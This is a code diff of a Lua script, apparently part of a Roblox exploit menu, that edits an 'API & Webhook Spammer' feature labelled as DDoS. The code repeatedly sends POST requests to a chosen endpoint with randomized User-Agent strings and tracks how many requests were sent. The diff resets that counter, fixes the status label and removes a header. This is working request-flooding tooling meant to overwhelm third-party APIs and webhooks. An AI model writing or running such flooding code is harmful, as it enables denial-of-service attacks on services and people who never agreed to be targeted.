@@ -7195,7 +7195,6 @@ function lib.DeveloperEncrypt(window,isShowed)
 						Method = "POST",
 						Headers = {
 							["Content-Type"] = web._strike,
-							["Accept"] = web._strike,
 							["User-Agent"] = lib.randomString(),
 							--(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
 							--(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
@@ -7211,6 +7210,9 @@ function lib.DeveloperEncrypt(window,isShowed)
 
 		local jammer = ddos:Toggle("API & Webhook Spammer",false,function(value)
 			web._spam = value
+			if value == false then
+				web._request_sent = 0
+			end
 		end)
 		local endpointresponse = nil
 		local kdnsosjekdnsksjekjeoensksjs = "100"
@@ -7251,13 +7253,12 @@ function lib.DeveloperEncrypt(window,isShowed)
 
 						kdnsosjekdnsksjekjeoensksjs = tostring(endpointresponse.StatusCode)
 						web._request_sent = web._request_sent + 1
-						ddoswebsitestrike:EditLabel(`URL : {lib:ColorFonts(web._strike,"Bold,Green")}\n\nStatus Code : {lib:ColorFonts(endpointresponse.StatusCode,"Bold,Sky Blue")}\nStatus Text : {lib:ColorFonts(kdnsosjekdnsksjekjeoensksjs:gsub("100","Continue"):gsub("101","Switching Protocols"):gsub("200","OK / Received"):gsub("201","Created"):gsub("204","No Content"):gsub("301","Moved Permanently"):gsub("302","Found"):gsub("304","Not Modified"):gsub("400","Bad Request"):gsub("401","Unauthorized"):gsub("403","Forbidden"):gsub("404","Not Found"):gsub("429","Too Many Request"):gsub("500","Internal Server Error"):gsub("502","Bad Gateway"):gsub("503","Service Unavailable"):gsub("504","Gateway Timeout"),"Bold,Sky Blue")}\nRequest send : {lib:ColorFonts(lib:CurrencyFormat(web._request_sent),"Bold,Sky Blue")}`)
+						ddoswebsitestrike:EditLabel(`URL : {lib:ColorFonts(web._endpoint,"Bold,Green")}\n\nStatus Code : {lib:ColorFonts(endpointresponse.StatusCode,"Bold,Sky Blue")}\nStatus Text : {lib:ColorFonts(kdnsosjekdnsksjekjeoensksjs:gsub("100","Continue"):gsub("101","Switching Protocols"):gsub("200","OK / Received"):gsub("201","Created"):gsub("204","No Content"):gsub("301","Moved Permanently"):gsub("302","Found"):gsub("304","Not Modified"):gsub("400","Bad Request"):gsub("401","Unauthorized"):gsub("403","Forbidden"):gsub("404","Not Found"):gsub("429","Too Many Request"):gsub("500","Internal Server Error"):gsub("502","Bad Gateway"):gsub("503","Service Unavailable"):gsub("504","Gateway Timeout"),"Bold,Sky Blue")}\nRequest send : {lib:ColorFonts(lib:CurrencyFormat(web._request_sent),"Bold,Sky Blue")}`)
 						http({
 							Url = web._endpoint,
 							Method = "POST",
 							Headers = {
 								["Content-Type"] = web._strike,
-								["Accept"] = web._strike,
 								["User-Agent"] = lib.randomString(),
 								--(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
 							        --(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
